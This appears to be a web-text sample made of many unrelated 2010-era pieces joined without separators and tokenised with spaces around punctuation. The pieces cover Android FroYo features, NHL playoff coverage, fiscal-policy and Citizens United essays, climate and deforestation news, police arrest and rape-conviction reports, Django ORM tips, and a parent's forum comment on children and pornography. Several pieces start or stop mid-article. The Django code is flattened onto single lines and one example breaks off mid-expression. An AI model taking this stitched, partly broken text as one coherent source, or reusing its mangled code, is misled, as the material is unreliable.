These include better Exchange support , with auto - discovery , improved security , and GAL lookup , and new device admin APIs .
3 ) Cloud - to - Device API -- Google services , Chrome extensions , and soon - to - be released Chrome apps will be able to sync with your Android device .
If you need directions from Google Maps , it can be sent directly .
4 ) Tethering --
This was also a rumored feature for a few weeks .
The feature will be in the " settings " menu , and clicking " portable wi - fi hotspot . "
5 ) New Browser --
The Javascript interpreter in Chrome will be used in FroYo 's native browser , offering a 2 x - 3 x Javascript performance boost .
Google 's Vic Gundotra said it will be the fastest mobile browser available .
6 ) Install apps on SD memory --
One of the main problems people had with Android was that you could not install apps on your removable memory card , you were limited to the device 's physical memory , which in some cases was quite limited .
In FroYo , apps can be moved to , and launched from , the phone 's SD card .
7 ) Flash 10.1 and AIR support --
This one is not a surprise , as Adobe and Google have both said this would be coming .
8 ) Web - based Android Market --
Without a doubt one of the weakest aspects of consuming apps on the Android Platform was that you were limited to only seeing what was shown on your mobile device 's screen , which in most cases is not very appealing .
9 ) App auto - updating --

BOSTON -- Down 3 - 0 in the series , then down 3 - 0 in Game 7 .
It looked as if the Philadelphia Flyers had finally run out of rallies against the Boston Bruins .
Turns out Simon Gagne and his teammates were just warming up .
Taking advantage of a too - many - men - on - the - ice call , Gagne scored on a power play with 7:08 left for a thrilling 4 - 3 victory Friday night in the Eastern Conference semifinals .
The win set up a most unlikely matchup for a trip to the Stanley Cup final -- the seventh - seeded Flyers vs. the eighth - seeded Montreal Canadiens starting Sunday night in Philadelphia .
" If we believe in ourselves and keep going with this , who knows what can happen ? " said Scott Hartnell , who scored Philadelphia 's second goal .
Flyers coach Peter Laviolette added , " The game 7s are tough .
There 's a lot of pressure .
It 's a game that 's made for men .
And our guys proved to be men . "
The Bruins became the third team in NHL history to lose a series after winning the first three games .
" The bottom line is we had a 3 - 0 lead in the series , we had a 3 - 0 lead tonight , and we blew them both , " Boston coach Claude Julien said .
" We have to take the responsibility that goes with it .
Everyone . "
The Flyers on the bench smacked their sticks against the boards when they saw the Bruins had an extra skater , trying to get the officials ' attention .
Vladimir Sobotka had jumped on the ice , but Marc Savard , who had raised his stick to call for a replacement , stayed on .
" I saw it right away , " Flyers captain Mike Richards said .
The whistle blew .
" I saw two centermen out there and I said , ` What 's going on ? " said Milan Lucic , who had two goals for Boston .
The Flyers capitalized when Richards ' shot from the right circle hit players in front of Tuukka Rask .
The puck bounced and Gagne , stationed to Rask 's left , flipped the puck over the goalie 's right shoulder with 18 seconds left in the power play .
Gagne , who had four goals after returning from a toe injury for Game 4 , thought the Bruins might have grown tense as their 3 - 0 lead began to shrink .
" Sometimes you 're nervous and you make mistakes , " he said .
" Then they had too many men on the ice and that might be our chance to win the game and we did . "
The only other teams to win a series after trailing 3 - 0 were the 1942 Toronto Maple Leafs , who beat Detroit , and the 1975 New York Islanders , who eliminated Pittsburgh .
The other 159 teams that won the first three games in a series all won them .
The Bruins shot out to a 3 - 0 lead on power - play goals by Michael Ryder and Lucic and another goal by Lucic .
And only 14:10 had been played .
Then James van Riemsdyk scored with 2:48 left in the first period for the Flyers .
Second - period goals by Hartnell at 2:49 and Danny Briere at 8:39 tied it at 3 .
When the final buzzer sounded , the Flyers poured off their bench and surrounded goaltender Michael Leighton , who started his second playoff game for injured Brian Boucher .
While the Flyers celebrated , the yellow towels that fans twirled to spur on their team floated to the ice , no longer needed until next season .
Boston center Patrice Bergeron took a slap shot with one of them -- like the Bruins , it did n't go far .
Boston was hurt by the same too - many - men - on - the -ice call in the 1979 Stanley Cup semifinals against Montreal .
In that Game 7 , the penalty led to Guy Lafleur 's tying goal with 74 seconds left in the third period , then Yvon Lambert won it in overtime for the Canadiens .
Boston lost its third straight Game 7 and first since falling to Carolina in last year 's conference semifinals after battling back from a 3 - 1 series deficit .
The Bruins and Flyers played aggressively at the start with plenty of end - to - end action in the first 5 minutes .
Boston got a break when Hartnell was penalized for high - sticking at 5:19 and Ryder scored his fourth playoff goal on a rebound 8 seconds later .
Another Bruins power play 3 minutes later led to another goal , this one by Lucic , who tipped in a pass across the crease from Dennis Wideman in the right corner .
Lucic struck again , scoring his fifth playoff goal five minutes later , at 14:10 on a shot from the right circle .
Leighton , who took over in Game 5 after sitting out nearly two months , did n't allow another goal .
Van Riemsdyk began the comeback with his first playoff goal 3 minutes after Lucic 's second goal on a soft shot that trickled by Rask .
That was the first of nine consecutive shots by Philadelphia .
One of them was Hartnell 's second goal of the playoffs .
Another was Briere 's seventh playoff goal -- on a wraparound .

" For some years Bill Niskanen of the libertarian Cato Institute has argued that STB actually increased spending and made deficits worse .
His argument is that the cost of spending is ultimately the taxes that will have to be raised to pay for it .
Thus fear of future tax increases was the principal brake on spending until STB came along .
By eliminating tax increases as a necessary consequence of deficits , it also reduced the implicit cost of spending . "
These days , I only rarely agree with Bruce Bartlett ’s writings .
But he does have a point here , citing Bill Niskanen , about why the " Starve the Beast " - strategy for containing government spending may not work :
The point here is that if people do not associate higher spending with the sacrifice consisting of higher taxes , then many voters will feel that all higher spending results in is more money from the state , while in the past when deficits were shun , people associated higher spending with the sacrifice of higher taxes .
If for example Bush 's big spending increasing schemes , the " No Child Left Behind " act , the Medicare prescription drug benefit act and the Iraq war , had been fully funded by tax increase , then it seems likely that there would have been stronger opposition to them .
Thus , at least in the short - term , " Starve the beast " might increase spending .
The fact that interest payments will become a bigger cost in the budget if a government runs up a big national debt is also something that in the long term will increase spending .
Whether or not that remains the case in the long run depends on how high cost in the long term that high deficits are associated with , something which in turn depends on how vigilant the bond market is .
If a country 's bonds are considered a " safe haven " ( and through the self - fulfilling prophecy mechanism becomes a " safe haven " ) by credit rating agencies and the bond market , like for example the United States and Germany ( and to lesser extent Britain and France ) , then the political price of high deficits will probably be lower than the political price of higher taxes , meaning that tax cuts or the absence of tax increases probably increases spending .
By contrast , a country 's bonds are considered to be " unsafe " ( and through the self - fulfilling prophecy mechanism becomes " unsafe " ) , as is the case these days ( but was n't until recently to any major extent ) with Greece and Portugal ( and to a lesser extent Spain and Italy ) , then deficits will put stronger pressure to reduce spending than higher taxes .
Also relevant is the relative popularity among the general population for keeping taxes low or keeping spending high .
If keeping taxes low taxes is more popular than keeping spending high , than " Starve the beast " might work .
But if the reverse is true , than it will never work .
That is of course why a popular fix is raising taxes for the wealthy .
The majority of people usually do n't mind if a small majority of rich people pay more in taxes , but they usually do oppose paying higher taxes themselves .
The problem is that tax increases for the rich can usually at best only fill a small part of the large budget gaps that most countries have , especially if you consider the growth depressing ( and tax evasion increasing ) effects of such tax increases .
Indeed , if you have gone too far along the Laffer Curve , such tax increases might even reduce revenues .
In reality , politicians will be forced to either cut spending or raise taxes for people with low or moderate income - or both cut spending and raise taxes for " normal people " .

Doctor
Who star Karen Gillan has hit back at suggestions her character Amy Pond is too sexy .
Speaking to the Radio Times , the actress said she did not want " strong female "
Amy to conform to a simple " girl - next - door " formula .
She added that her character 's short skirts were what young women wore .
The 22 - year - old , from Inverness , also said " feminism was not the issue any more " and her character would not just stand about in awe of the doctor .
Kissogram
Amy recently tried to seduce the Doctor in an episode of the BBC1 show , which is popular with children .
Amy is likeable , I hope , but she 's not ordinary Karen Gillan
Gillan told the magazine : " I guess there was a bit of an uproar and I really did n't see that coming .
" I just do n't get it with the skirts .
It 's what any girl on the street is wearing .
" I mean , Amy 's not a schoolgirl , she 's 21 , pretty much the same age as me , and we all wear stuff like this . "
Gillan said the relationship between Amy and the Doctor was one of equals .
She said : " Feminism is not the issue any more , not for me , anyway .
" It 's just never occurred to me that a woman would n't be equal , in any sphere , to a man .
" It 's nothing that has ever come up in my life and nothing I 've thought about in terms of Amy .
" She 's just a strong girl , woman , whatever .
Oh , let 's just say she 's a strong female . "
The actress said she never wanted to base Amy on any kind of formula from the past - " to conform to what works - or what has worked - in a companion ; you know , the whole , likeable , girl - next - door business " .
She added : " Amy is likeable , I hope , but she 's not ordinary .
She 's quite complicated and there are layers to explore .
" So I was taking a few risks with her and I think it works . "
Food News : Burger King Introduces BK Fire - Grilled Ribs

I ’ll put this on the list of really bad ideas .
Burger King is going nationwide with their BK Fire - Grilled Ribs .
Prices and participation may vary but $ 7.99 for a 6 piece seems to be the going rate .
My local BK has them for $ 7.99 .
Would you seek out ribs at Burger King ?
I do n’t have much more info such as nutrition facts because Burger King has a website that does n’t keep up with the rest of the world .
The first comprehensive synthesis on the effects of climate change on the world 's oceans has found they are now changing at a rate not seen for several million years .
In an article published June 18 in Science magazine , scientists reveal the growing atmospheric concentrations of man-made greenhouse gases are driving irreversible and dramatic changes to the way the ocean functions , with potentially dire impacts for hundreds of millions of people across the planet .
The findings of the report emerged from a synthesis of recent research on the world 's oceans , carried out by two of the world 's leading marine scientists , one from The University of Queensland in Australia , and one from The University of North Carolina at Chapel Hill , in the USA .
Professor Ove Hoegh - Guldberg , lead author of the report and Director of The University of Queensland 's Global Change Institute , says the findings have enormous implications for mankind , particularly if the trend continues .
He said that the Earth 's ocean , which produces half of the oxygen we breathe and absorbs 30 % of human - generated CO 2 , is equivalent to its heart and lungs .
" Quite plainly , the Earth can not do without its ocean .
This study , however , shows worrying signs of ill health .
" It 's as if the Earth has been smoking two packs of cigarettes a day ! "
He went on to say , " We are entering a period in which the very ocean services upon which humanity depends are undergoing massive change and in some cases beginning to fail , " says Prof.
Hoegh - Guldberg .
" Further degradation will continue to create enormous challenges and costs for societies worldwide . "

He warned that we may soon see " sudden , unexpected changes that have serious ramifications for the overall well - being of humans , " including the capacity of the planet to support people .
" This is further evidence that we are well on the way to the next great extinction event . "
The " fundamental and comprehensive " changes to marine life identified in the report include rapidly warming and acidifying oceans , changes in water circulation and expansion of dead zones within the ocean depths .
These are driving major changes in marine ecosystems : less abundant coral reefs , sea grasses and mangroves ( important fish nurseries ) ; fewer , smaller fish ; a breakdown in food chains ; changes in the distribution of marine life ; and more frequent diseases and pests among marine organisms .
Report co-author , Dr John F. Bruno , an Associate Professor at The University of North Carolina , says greenhouse gas emissions are modifying many physical and geochemical aspects of the planet 's oceans , in ways " unprecedented in nearly a million years . "
" This is causing fundamental and comprehensive changes to the way marine ecosystems function , " Dr Bruno said .
" We are becoming increasingly certain that the world 's marine ecosystems are approaching tipping points .
These tipping points are where change accelerates and causes unrelated impacts on other systems , the results of which we really have no power or model to foresee . "
The authors conclude : " These challenges underscore the urgency with which world leaders must act to limit further growth of greenhouse gases and thereby reduce the risk of these events occurring .
Ignoring the science is not an option . "

In their study , the researchers sought to address a gap in previous studies that have often overlooked the affects of climate change on marine ecosystems , due to the fact that they are complex and can be logistically difficult to study .
According to leading US marine scientist , the University of Maine 's School of Marine Services Professor Robert S. Steneck , the study provides a valuable indicator of the ecological risk posed by climate change , particularly to coastal regions .
" While past studies have largely focused on single global threats such as ' global warming ' , Hoegh - Guldberg and Bruno make a compelling case for the cumulative impacts of multiple planet - scale threats , " Prof .
Steneck said .
BOGOTÁ , Colombia —
Given the staid nature of the political establishment in Colombia , Washington ’s top ally in the region , and the broad popularity of President Álvaro Uribe , it seemed a foregone conclusion to many here that his heir apparent would clinch the presidency in the coming elections without too much of a struggle .
So imagine the surprise when Juan Manuel Santos , a former defense minister and the architect of some of Mr. Uribe ’s crushing blows against leftist guerrillas , found himself trailing in recent national polls to a quirky , unpredictable mathematician who murmurs in French about arcane philosophical concepts and wears a chinstrap beard with the air of a latter - day Thoreau .
The surge of this candidate , Antanas Mockus , who served two very colorful terms as Bogotá ’s mayor , has made for one of Latin America ’s most exceptional presidential races in recent memory , pitting an insurgent intellectual against an establishment that suddenly finds itself on the defensive .
While Mr. Uribe is still admired after making inroads against guerrillas and overseeing a decline in crimes like murders and kidnappings , many voters are weary of the scandals involving his intelligence agency and his supporters ’ ties to right - wing paramilitary groups .
The specter of violence is also returning , with homicides climbing 16 percent in 2009 , possibly affecting Mr. Uribe ’s legacy .
Indonesian president Susilo Bambang Yudhoyono says he will introduce a two - year moratorium on deforestation , a large source of income for his country which also contributes heavily to global warming .
" We will ... conduct a moratorium for two years where we stop the conversion of peat land and of forest , " Mr Yudhoyono said at a joint press conference with Norwegian prime minister Jens Stoltenberg a day before an international deforestation conference starts in Oslo .
The decision was part of a deal reached with Norway , which has agreed to contribute up to $ US1 billion to help preserve the Indonesian forests .
Together with Brazil , Indonesia boasts one of the world 's largest rain forests , which function as global " lungs " that transform carbon dioxide into oxygen .
The country however also accounts for a large portion of the world 's deforestation , especially on the islands of Sumatra and Borneo .
Palm oil producers have especially caught the attention of environmental protection groups .
According to Greenpeace , forests covering the equivalent of 300 football fields are eradicated every hour in Indonesia , which along with Malaysia produces 80 per cent of the world 's palm oil , used for cosmetics , food and fuel .
A Norwegian negotiator said the moratorium would take effect " immediately " .
" There is of course a lot of illegal logging , " said Hans Brattskar , who heads up the International Climate and Forest Initiative , launched by the Norwegian government .
" But the conversion of the forests and the peat land into plantations and for industrial use , especially for paper and palm oil production , represents a very large part of deforestation in Indonesia , " he added .
" It is therefore important to emphasise the Indonesian authorities ' courage in depriving themselves of potential future revenue sources . "
Mr Yudhoyono acknowledged it was difficult to find the right balance between the socioeconomic interests of his people and the fight against climate change .
Norway will begin support for Indonesia 's efforts by enabling the country to set up a control mechanism to help fight deforestation , and as of 2014 the Scandinavian country will offer aid contingent on Jakarta 's progress .
" If there is no reduced deforestation , we will not pay .
If there is reduced deforestation , we will pay , " Mr Stoltenberg told the press conference .
According to the United Nation 's Intergovernmental Panel on Climate Change , or IPCC , deforestation is responsible for 17 per cent of global greenhouse gas emissions , which is more than all the world 's modes of transport combined .
The Norwegian aid to Indonesia will come out of the three billion kroner ( $ 555 million ) that the country puts aside every year to fight deforestation around the world .
Norway , which owes its prosperity to its vast oil and gas reserves , has already signed similar agreements with Brazil and Guyana .

Cop Suspended After Arresting Newlywed Husband Rushing
Wife to ER
Husband may have saved his wife 's life , but was charged with a felony .
June 22 , 2010  --
A Chattanooga police officer who arrested a newlywed husband for running red lights to get his critically ill wife to a hospital emergency room has been suspended , officials said today .
Eric Wright , whose wife Aline is a left leg amputee , said Officer Jim Daves even tried to block him as he carried her into the ER of the Erlanger Medical Center .
Two days later , Daves arrested Eric Wright and charged him with traffic violations , disorderly conduct , reckless endangerment , evading arrest and assault on an officer , which is a felony .
The officer claimed in his report that Wright has scraped his arm with a fingernail .
Eric
Wright has been suspended from his job because of the arrest and had to post $ 7,500 bail .
But his wife has recovered her stroke , which her husband feared could have cost her life .
Daves , however , is out of uniform , at least temporarily .
" At this time Officer Daves has been put on paid administrative leave .
He has been rellieved of all of his police duties until the completion of the internal affairs investigation , " Chattanooga Police spokeswoman Lt. Kim Noorbergen told ABC News .
Aline and Eric Wright had been married for four days last Wednesday when they became alarmed that Aline was having a medical crisis .
" I started feeling some left arm numbness and a facial droop , " Aline Wright told ABC News .
" It appeared to me that I was probably having a stroke . "
Eric Wright , a medic at the hospital who has spent two tours in Iraq , put her in the car and rushed to the hospital , where they both work .
During the dash to the hospital , Eric Wright told ABC News he paused at two red lights , but then went through them .
After passing through the second red light , a police cruiser pulled up behind the couple 's vehicle , following it with lights and sirens all the way to the hospital .
Eric
Wright recalls the officer physically blocking his way as he carried Aline into the emergency room .
The husband told ABC News that his wife may have died if he had stopped for the officer .
" Every minute is critical in a situation like that , " he said .
According to Daves ' written affidavit obtained by ABC News :
The " defendant stopped [ his car ] in the ER entrance and jumped out and ran .
Police made contact with Defendant at the passenger side of his vehicle and I grabbed the Defendant 's arm and he pushed me away scraping my arm with his fingernail .
Defendant yelled and said it was an emergency ... "
" Defendant pushed through the crowd and carried a female back into the emergency room and place [ d ] her in a room with no permission of the hospital staff , " the officer wrote .
Eric Wright has denied Daves ' statements .
" I never had any [ physical ] contact with the officer at all , " he said .
And Wright said he did not enter a hospital room without permission .
" In fact , I called the emergency room to alert them and let them know we would be arriving , " he said .
Newlywed Husband Arrested Two Days After Running Red Lights to Get Wife to Hospital
The husband said said that Daves tried to come into the area where his wife was being treated .
" Upon our arrival , it was crucial I be present , " Eric Wright said .
" I needed to make sure my wife was accurately relaying her symptoms and medical history . "
The officer allegedly told Eric Wright that he would be charged with a felony if he did n't go to the police station .
On Thursday morning , Eric Wright went to Hamilton County jail where he was informed that there was no warrant out for his arrest and that he was free to go .
But according to the Chattanoga police botter , he was arrested at his home on Friday .
A court date is set for July 9 .
Daves could not be reached for comment and the hospital did not return ABC News ' phone calls .
Justice Kennedy , who wrote the majority opinion , has proved to be a powerful advocate of individual liberty ( including in cases establishing the right to private homosexual conduct and the rights of Guantánamo detainees ) .
But he remains staunchly conservative in his understanding of the role of corporations as bulwarks againstgovernment .
His central argument in the Citizens United case was that the right to speak freely cannot vary based on the identity of the speaker .
An individual who speaks is maintaining his independence vis-à - vis the state ; and so , by extension , is a corporation , because corporations are nothing more than collections of individuals organized to achieve some greater end .
According to this view , civil society is made up not just of civic groups like the N.A.A.C.P. or the N.R.A. , but also of for - profit corporations .
To deny them the right to speak freely is to allow government to pick and choose which kinds of speech it wants to allow and hence to distort the free marketplace of ideas .
Kennedy has a point : corporate speech often shades into the realm of the expressive , whether the message is creative or political .
Thus a progressive approach to corporate speech cannot simply try to demarcate different kinds of expression .
The progressive argument must go deeper , to the institutional reality of the effects that corporate money can have on our entire democratic system , elections included .
Supreme Court doctrine has historically tried to capture a version of this concern by asserting that the government has a legitimate interest in “ anticorruption ” — the idea being that money from corporations can produce the appearance of a quid pro quo from elected officials .
The court has also sometimes spoken of an “ antidistortion ” value — the concern that corporations will have a disproportionate effect on elections by providing more money than individuals can .
Justice Souter , quoted by Justice Stevens in his Citizens United dissent , referred to these interests collectively as demonstrating a concern for “ democratic integrity ” — a concern that may in some circumstances outweigh the constitutional value of unfettered speech .

But these polite , high - sounding terms do not go far enough .
Couched in abstract language , they reflect the liberals ’ discomfort with stating bluntly that money talks .
A truly progressive jurisprudence would go further in its legal reasoning , acknowledging that the for - profit corporation , man ’s most - advanced technology for making and concentrating wealth , creates unique risks for the structure of democratic government .
It is true that corporate political speech is still speech , as Justice Kennedy and the A.C.L.U. alike have insisted .
But that speech serves different ends than individual speech .
Organized to use all lawful means to generate profit , corporations have the means and opportunity to try to capture the operation of government to serve this objective .
Campaign - spending lets them do it directly .
That is why Congress must be able to limit the effects of corporate speech during elections .
It is a matter of defending democracy against the risk that business interests will come to dominate government decision - making — an interest that derives from the constitutional commitment to republican government .
V.DUE PROCESS
The renewed battle lines between constitutional progressives and conservatives are not restricted to the First Amendment : the constitutional debate about business regulation is also becoming increasingly salient .
This term , for example , the Supreme Court took up the constitutionality of the Public Company Accounting Oversight Board , created by the Sarbanes - Oxley Act to review accounting practices .
Similar challenges will certainly be brought to the new financial regulations proposed by the Obama administration .
The council of regulators that is supposed to identify risk and deal with emergencies will be challenged as unconstitutional , as will the design of the consumer - credit - protection entity that is expected to be housed somewhere in the Federal Reserve .
Wherever possible , conservatives claim that legislation aimed at regulating business actually infringes on the constitutional rights of individuals .
Indeed , the very authority of the government to resolve the affairs of large financial corporations — the heart of the new financial - reform legislation — will very likely be challenged as a violation of the due- process rights of those firms and their shareholders .
Thus will the aim to stymie structural change be framed in terms of individual freedom .
It will be up to progressives to explain why this view is mistaken — and why limiting corporate rights is justified .
The grave difficulty that must be met by a new progressive constitutional approach can so far be sensed most readily not in court cases but in the government ’s actions and justifications connected with the bailout of financial institutions .
The now - canonical A.I.G. bailout serves as a useful example .
In saving the insurance giant , the government ( under the Bush administration ) famously paid A.I.G. counterparties , including Goldman Sachs , 100 cents on the dollar for insurance contracts that they had taken out with the firm .
Critics wondered loudly why the government did n’t renegotiate the debts and demand that the counterparties settle at a discount .
Then , while in control of A.I.G. ( this time under the Obama administration ) , the government ’s managers allowed A.I.G. to pay out the bonuses it owed employees under their employment contracts — again inviting the criticism that a private acquirer would have renegotiated and paid out less , or nothing .
TRENTON -- N.J. Gov. Chris Christie today shrugged off Saturday 's record - breaking Statehouse protest , saying it had " absolutely no effect on me . "
The Republican governor said he hoped the 30,000 to 35,000 protesters " had a good time , and I hope that it helped to spur Trenton 's economy . "
The crowd , mostly from public worker unions and other progressive groups , flooded the capital on Saturday to rally against Christie 's proposed budget cuts and property tax proposals .
Speakers , including New Jersey Education Association president Barbara Keshishian , said the protest was also a warning to Democrats -- who have traditionally received backing from organized labor -- not to serve as Christie 's " accomplices . "
More coverage :
• Record crowds flood Trenton to protest against N.J. Gov. Chris Christie , budget cuts
• Live coverage : N.J. public workers arrive for noon rally at Statehouse
• N.J. rally against Gov. Chris Christie 's budget cuts could draw 30 K , organizers say
• Public worker unions plan massive rally in Trenton against Gov. Chris Christie 's budget cuts
• Hundreds of N.J. librarians protest $ 10.4 M proposed budget cuts
• Complete coverage of the 2010 New Jersey state budget
Asked about the warning , Christie said " good try " and disappeared into his office without taking further questions .
The protesters said they objected to Christie 's proposed $ 29.3 billion budget because it contains cuts affecting the poor and middle - class , while at the same time the governor has vetoed a tax increase on millionaires .
They also vented their anger over recent pension and benefit reforms -- which passed the Legislature with bipartisan support -- and Christie 's proposed 33 - bill " toolkit " for local governments to control costs .
Union leaders called the toolkit a " smokescreen " that would harm their collective bargaining rights and lead to mass layoffs of police , firefighters and teachers .
" We are experiencing the most severe , pervasive and sustained attack on public employees , public employee unions and public sector collective bargaining " since workers got the right to organize , Chris Shelton , a vice president with the Communications Workers of America , said Saturday .
" We are saying loud and clear to those folks in the Statehouse -- whether they are sitting in the governor 's office or the Legislature -- we are fed up , and we are not going to take it anymore . "
Few Democrats -- who control both houses of the Legislature -- were in attendance on Saturday .
They said organizers had not invited them .
Senate President Stephen Sweeney ( D - Gloucester ) , an ironworkers union official , said union leaders are doing their members a disservice through boisterous protests .
" Instead of showing the public that we 're in it together , they 're showing them that they still do n't get it , " Sweeney said Saturday .
" We 're not accomplices .
If anything , we 're trying to fix the state with him . "
Assembly Speaker Sheila Oliver ( D - Essex ) said Democrats had not " walked away from " organized labor , or " any constituency in this state . "
She said their support of the millionaires tax to restore property tax rebates for senior citizens demonstrates the party is not complicit with Christie 's agenda .
" We all understand that we have a serious fiscal problem in this state , " said Oliver , who like Sweeney did not attend the rally .
" People are very concerned about the policy direction that the governor is taking .
It is not just those who have narrow interests because they are public employees . "
While many doubted the governor would listen , protesters said they had to send a message .
" I feel that he needs to know that he 's single - handedly being a bully , " Peter Harrington , a Sussex County resident and teacher at West Orange High School , said Saturday .
" He should have sat down and talked with us .
You ca n't dictate education . "

For the most part , I like the Django ORM because it makes it easy to write reusable code that reads and writes from the database .
I ’ve found that the ORM can be a double edged sword though , as it sometimes becomes too easy to read and write from the database .
In hindsight , most of the following mistakes are pretty obvious once you understand how the ORM works , but I still see these all the time so I thought it ’d be good to point them out .
If you want a more basic guide to Django model and querying patterns , Better Django Models is a great article for that , so I wo n’t reiterate the points made in there .
For the following examples , I ’ll be using these models :
class Book ( models .
Model ) : author = models .
ForeignKey ( User ) class Profile ( models .
Model ) : user = models .
ForeignKey ( User )
1. book .author does a database query
OK , this is pretty basic , but it has a bunch of implications , such as :
book.author.id != book.author_id
Well , the values returned will be the same , but book .
author .id does an additional database query .
There is pretty much never a good reason to do book .
author .id unless you know for sure that you ’re accessing an internally cached instance , either obtained from select_related or because you ’ve already accessed book .
author and created a cached instance , but even then , why chance it ?
For the same reason ,
this is bad
book = Book ( ) book.author = profile.user book.save ( )
and this is good
book = Book ( ) book.author_id = profile.user_id book.save ( )
2. Querysets are not lists
How many database queries is this ?
books = Book.objects.all ( ) print books [ 0 ] print books [ 1 ]
The answer is 2 , one for each slice .
It ’s much easier to see that this is 2 separate queries once you realize that the above is essentially equivalent to
print Book.objects.all ( ) [ 0 ] print Book.objects.all ( ) [ 1 ]
This result is a combination of Django ’s querysets being lazy , meaning they wo n’t be evaluated until they ’re accessed , and because a queryset ’s internal cache does n’t get populated unless you iterate through the queryset .
If we do :
books = Book.objects.all( ) for book in books : print book print books [ 0 ] print books [

This will result in one database query because by iterating through the queryset , the internal cache will get populated and books [ 0 ] and books [ 1 ] will simply access the internal cache ( I do n’t recommend iterating through the entire queryset if you only need the first two books , I ’m just trying to make a point ) .
3. Use iterator ( ) when you do n’t need or want the internal queryset cache
As I just mentioned , iterating through the queryset will populate the internal cache .
Sometimes though , the internal cache may not be desirable .
For example if we have one million users :
users = User.objects.all( ) for user in users : print user.username
this will load one million users into memory because users internal cache will be populated .
The iterator ( ) method will tell the queryset not to populate the internal cache , which can significantly reduce memory usage and increase performance .
users = User.objects.all( ) for user in users.iterator ( ) print user.username
Even for smaller querysets , it ’s not a bad idea to use the iterator ( ) method if you know you ’re not going to reuse the queryset .
4 . Be careful with model properties / methods that do database lookups
class Profile ( models .
Model ) : user = models .
ForeignKey ( User ) @property def username ( self ) : return self.user.username
There ’s nothing necessarily wrong about this , but it ’s dangerous to expose properties or methods that hide database lookups .
Especially if you ’re working with designers who may not know what your schema looks like , exposing properties like this makes it easy to do :
{ % for profile in profiles %} < li>{ { profile.username }}</li > { % endfor %}
whereas it ’s much easier to see that
{ % for profile in profiles %} < li >{ { profile.user.username }}</li > { % endfor %}
will do N User lookups .
If for some reason you find that you do need to create a property that does a database lookup , make it private .
class Profile ( models .
Model ) : user = models .
ForeignKey ( User ) @property def _username ( self ) : return self.user.username
Private methods ca n’t be used in templates , so it becomes much harder for a designer to shoot your site in the foot .

Two National Post photographers were arrested Saturday night during anti-G20 demontrations in downtown Toronto .
Brett Gundlock , a staff photographer for the Post , was tackled and taken away by several police officers in riot gear as they attempted to disperse protesters hanging around near the Ontario legislature .

Kier Gilmour , a photographer for Canwest News Service who witnessed the arrest , said the officers knocked Mr. Gundlock to the ground and then dragged him away .
He had been standing with several other media photographers at the time .
“ They slammed him down , onto his ass so to speak , then they dragged him back up and pulled him back to the police line , ” Mr. Gilmour said .
Colin O’Connor , a freelance photographer working for the Post , was also apparently detained .
Mr. Gilmour said the police were being very aggressive in trying to disperse the remaining demonstrators near Queen ’s Park , which is several blocks away from the secure zone where the G20 meeting is taking place .
“ They kept screaming ‘ it ’s time to go home , it ’s time to go home . ' ”
He said that every few minutes a group of officers would rush the crowd at a full sprint and grab a few people .
The protesters were not doing anything violent or provocative at the time , he said .
The photographers were believed to have been taken to a specially built detention centre east of the downtown core .
More than 100 people were believed to have been detained and taken to the centre last night .
The Post had received no communications from the detained men as of 10:30 tonight .
Well , the New Orleans Saints have gotten some good news .
Safety Darren Sharper is returning .
Per a league source , Sharper will sign a one - year deal .
His primary goal , we ’re told , is to pursue another championship .
He also was pursued by the Jaguars .
It ’s unknown whether the Jags offered more money , or whether the Saints increased the offer that had been on the table for several weeks .
Sharper joined the team in 2009 , after four seasons with the Vikings .
He was expected to be a fairly hot commodity in free agency , despite his age .
A knee problem required him to undergo arthroscopic surgery two days before the signing period opened , delaying his ability to hit the market when the most money was flowing .

Roughly six years ago , Al Yeganeh , the curmudgeonly soup chef who inspired the " Soup Nazi " character on " Seinfeld , " closed his restaurant on West 55th Street in Hell 's Kitchen to open franchise stores .
The result : the Original SoupMan , a series of eateries and stores across the country that boast Yeganeh 's name , his soups and his legendary rules for ordering .
( Among them :
Have your money ready before you order . )
This week brings news that Yeganeh is re-opening the West 55th Street location in July , but under the Original ...
Marcus Huffman , the 39 - year - old Providence cop accused of raping a lesbian woman in a police station bathroom , was convicted of first - degree sexual assault .
He faces a possible life sentence , though his attorney says he plans to appeal .
The woman testified that Huffman raped her in the bathroom of a police substation in March 2007 after picking her up outside a Providence nightclub where she was turned away for being too drunk .
She said she could not remember what happened inside the bathroom , but that she woke up later with her pants undone and her undergarments removed .
She then walked to her aunt ’s house and was taken to a hospital , where she says Huffman showed up to take her report .
Prosecutor Maureen Keough accused Huffman of taking advantage of an intoxicated and physically helpless woman .
But lawyer Robert Caron attacked the woman ’s credibility , suggesting she had a consensual sexual encounter with Huffman and then lied about being raped because she did n’t want to tell her girlfriend the truth .
The woman identified herself at trial as a lesbian and said she had n’t had consensual sex with a man since early in high school .
" Samantha "
but that dose not make sense because that is how you say it in English - names are often said the same in French as they are in English as they are not specific to one language .
I know this is an old post , but thought I would share some .
I am going to have to side with Meriter here .
Yes , we need to monitor , we need to do our part as responsable parents , but sounds like this MOM was doing what she could , it STILL happened , and will continue to happen IN LIFE outside of the home at times , other kids talking about sex acts in front of your child , sharing pictures , who knows what will come , but we can't confine them to a Bubble or sheild them completely from this world , unless of coarse you Home school them , which many parents are opting to do these days .
I also agree with Meriter that I bet the Husband is not as repulsed as the wife or worried and if he is , he IS in the minority of men who grew up quite normal , even when porn did play some part in their growing up years , even if just magazines .
My husband had a collection of 300 Playboys when he was 12 , hid it from his Mom very well , he is the most faithful loving man imaginable , never had any kind of sex addiction .
He learned most of what he knew about pleasing me ( and we waited till marraige to have sex even ) from those magazines !
But he never ever shared this with me until he felt more comfortable with me talking about sex .
Men like to hide their porn well .
Your daughter is just Curious and WILL CONTINUE to be curious , it is best to not shame , but learn to be open about these things with her , allow her to share with you that she IS curious , and that is OK , you want her to come to you about ANYTHING and EVERYTHING .
This is one of the hardest things in the world for parents do deal with , their children 's sexuailty .
If she really did make usernames as you said , with such vulgarity , I would guess she has been hiding ALOT already from you , for you to have this kind of SHOCK from this seemingly perfect child .
They will learn it somewhere .
I would not read TOOO much into this , I have 6 kids , 5 are boys , my oldest and me talk about sex openly , he even shares his reluctance to NOT look at porn but he is " drawn to it " as a high testosterone male , he is still a virgin , a wonderful son .
But it IS a battle and has been for years .
I now have a younger son who has looked and I have yet to download something to block it , but I plan too , the husband made a little game of it when he discovered , took some of the things he saved & deleted & stuck them back on his desktop one day so he would freak out .
( these things were nothing hard core , some were even sexual cartoons ) .
I know , I know , this is serious , you Moms are thinking , but the husband almost did n't tell me this cause he did n't want ME embarass him !
My husband was adamant about him not being shamed -- or I should say , not to ADD to his shame .
I think he is right .
